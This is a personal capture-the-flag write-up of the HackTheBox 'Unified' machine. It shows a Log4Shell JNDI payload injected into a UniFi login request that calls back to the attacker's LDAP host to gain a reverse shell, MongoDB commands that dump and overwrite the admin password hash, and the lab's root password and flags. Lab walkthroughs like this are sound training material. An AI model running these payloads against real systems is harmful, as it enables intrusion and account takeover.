---
title: Unified
author: Julien Bongars
date: 2025-05
tags:
  - HackTheBox
  - Very Easy
  - Linux
  - Hacking
---

ip = 10.129.71.133

found port 8443 on my own

## Ports

22 - ssh
6789 - ibm-db2-admin?
8080 - http-proxy - status 404 - should ffuf?
8443 - web dashboard trying to crack. cannot ffuf as will redirect to login
8843 - ssl? - status 400 - may be used for api?
8880 - tcp? - status 404 - should ffuf

## 8080

Proxy for 8443. Found the following paths:-

/print (Status: 302) [Size: 0] [--> https://10.129.68.135:8443/print]
/pages (Status: 302) [Size: 0] [--> /pages/]
/upload (Status: 302) [Size: 0] [--> https://10.129.68.135:8443/upload]
/file (Status: 302) [Size: 0] [--> https://10.129.68.135:8443/file]
/status (Status: 200) [Size: 76]
/v2 (Status: 302) [Size: 0] [--> https://10.129.68.135:8443/v2]
/api (Status: 302) [Size: 0] [--> https://10.129.68.135:8443/api]
/logout (Status: 302) [Size: 0] [--> /manage]
/setup (Status: 302) [Size: 0] [--> https://10.129.68.135:8443/setup]
/manage (Status: 302) [Size: 0] [--> https://10.129.68.135:8443/manage]
/op (Status: 302) [Size: 0] [--> https://10.129.68.135:8443/op]
/verify (Status: 302) [Size: 0] [--> /manage/account/verify?r=1]

## CVE-2021-44228: Log4j

link - https://censys.com/blog/cve-2021-44228-log4j

### Flow

we can modify the form data to inject a payload in the "remember password" field. This payload will be injected in the logger like so

```java
log.info("username: ${username} ; remember: ${remember});

# resolves to:-
log.info("username: ${payload.username} ; remember: ${<payload>});
```

We can use JNDI to dynamicall fetch a file using LDAP (we create a malicious LDAP server) to get a reverse shell up in the server.

Use burpsuite to capture the POST request from the unifi network server and forward request to repeater.

create tcp dump logger:

```bash
└──╼ [★]$ sudo tcpdump -i tun0 port 1389
```

#### Original Payload

```http
POST /api/login HTTP/1.1
Host: 10.129.53.120:8443
Content-Length: 81
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
Content-Type: application/json; charset=utf-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: */*
Origin: https://10.129.53.120:8443
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://10.129.53.120:8443/manage/account/login?redirect=%2Fmanage
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive

{"username":"testuser","password":"testpassword","remember": true,"strict":true}
```

#### Modified Payload

```http
POST /api/login HTTP/1.1
Host: 10.129.53.120:8443
Content-Length: 111
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
Content-Type: application/json; charset=utf-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: */*
Origin: https://10.129.53.120:8443
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://10.129.53.120:8443/manage/account/login?redirect=%2Fmanage
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive

{"username":"testuser","password":"testpassword","remember":"${jndi:ldap://10.10.14.147:1389}",
"strict":true}
```

#### Result

```bash
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes


18:33:36.891611 IP 10.129.53.120.55414 > htb-ie8f9usvwk.1389: Flags [S], seq 1293191773, win 64240, options [mss 1362,sackOK,TS val 3435078781 ecr 0,nop,wscale 7], length 0
18:33:36.891622 IP htb-ie8f9usvwk.1389 > 10.129.53.120.55414: Flags [R.], seq 0, ack 1293191774, win 0, length 0
```

User the following notes to launch LDAP attack: notes/infiltration/general/ldap-for-jndi-attack.md

once we get a shell we try to find the mongodb by either finding the socket or use tcp to call the instance.

keep in mind the port is 27117 and db is ace

```bash
mongo --port 27117 ace

# db.listCollections()
# db.admin.find().forEach(printjson)
```

We find the hash for admin account

```bash
# "x_shadow": "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",

# the $6 indicates the hash algo, Ry6Vdbse is the salt, the rest is the hashed password.

openssl passwd -6 -salt $(openssl rand -base64 16) password123
# output: $6$3PQnfHW5kwahebAm$KNiatOJON1Imt4YUmYsaSArn3R.r0QIFcrpySrqbrRaAfBulrPsqQjc20.WNjgbhIo1In17yytuZDIVxpgAGc/

# another option?
mkpasswd -m sha-512 Password1234
```

update the admin password:

```js
db.admin.updateOne(
  { _id: ObjectId("61ce278f46e0fb0012d47ee4") },
  {
    $set: {
      x_shadow:
        "$6$3PQnfHW5kwahebAm$KNiatOJON1Imt4YUmYsaSArn3R.r0QIFcrpySrqbrRaAfBulrPsqQjc20.WNjgbhIo1In17yytuZDIVxpgAGc/",
    },
  },
);
```

log into unified box, password to root account is: NotACrackablePassword4U2022

user: 6ced1a6a89e666c0620cdb10262ba127
root: e50bc93c75b634e4b272d2f771c33681
